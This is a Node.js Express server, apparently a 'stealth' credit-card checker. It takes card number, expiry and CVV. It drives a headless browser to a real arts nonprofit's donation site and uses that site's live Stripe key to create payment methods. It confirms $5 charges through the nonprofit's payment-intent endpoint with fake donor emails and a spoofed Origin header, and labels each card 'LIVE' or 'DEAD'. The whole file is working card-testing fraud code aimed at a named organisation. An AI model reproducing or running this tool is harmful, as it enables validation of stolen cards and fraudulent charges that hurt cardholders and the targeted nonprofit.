const express = require('express');
const puppeteer = require('puppeteer');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

const ARTPAN_PK = 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm';

app.get('/', (req, res) => res.send('Stealth Checker Online 🕵️‍♂️'));

app.get('/chk', async (req, res) => {
    const { card } = req.query;
    if (!card || !card.includes('|')) return res.send('Usage: /chk?card=num|mm|yy|cvv');

    const [num, mon, year, cvv] = card.split('|').map(i => i.trim());
    const fullYear = year.length === 2 ? `20${year}` : year;

    // Launch browser with Render-specific flags
    const browser = await puppeteer.launch({
        headless: "new",
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
    });

    try {
        const page = await browser.newPage();
        
        // 1. Visit the authorized domain to satisfy the "Surface" check
        await page.goto('https://www.artspan.org/', { waitUntil: 'networkidle2' });

        // 2. Create Payment Method using Stripe.js INSIDE the browser
        const stripeResult = await page.evaluate(async (pk, n, m, y, c) => {
            const stripe = window.Stripe(pk);
            return await stripe.createPaymentMethod({
                type: 'card',
                card: { number: n, exp_month: m, exp_year: y, cvc: c }
            });
        }, ARTPAN_PK, num, mon, fullYear, cvv);

        if (stripeResult.error) {
            return res.send(`<h2>❌ Surface Error</h2><p>${stripeResult.error.message}</p>`);
        }

        const pm_id = stripeResult.paymentMethod.id;

        // 3. Confirm via API (Now that we have a valid PM ID from a "Real Surface")
        const intentRes = await axios.post('https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent', {
            amount: 500, email: `donor${Math.floor(Math.random()*999)}@gmail.com`, live: true
        });

        const secret = intentRes.data.clientSecret;
        const confirmRes = await axios.post(`https://api.stripe.com/v1/payment_intents/${secret.split('_secret')[0]}/confirm`, 
            `payment_method=${pm_id}&client_secret=${secret}&key=${ARTPAN_PK}`,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.artspan.org' } }
        ).catch(e => e.response);

        const data = confirmRes.data;
        const isLive = data.status === 'succeeded' || (data.error && data.error.decline_code === 'insufficient_funds');

        res.send(`
            <div style="font-family:sans-serif; text-align:center; padding:20px;">
                <h1 style="color:${isLive ? 'green' : 'red'};">${isLive ? '✅ LIVE' : '❌ DEAD'}</h1>
                <p><b>Response:</b> ${data.error ? data.error.message : 'Success'}</p>
                <p><b>Token:</b> ${pm_id}</p>
            </div>
        `);

    } catch (err) {
        res.status(500).send(`System Error: ${err.message}`);
    } finally {
        await browser.close();
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Stealth API on ${PORT}`));
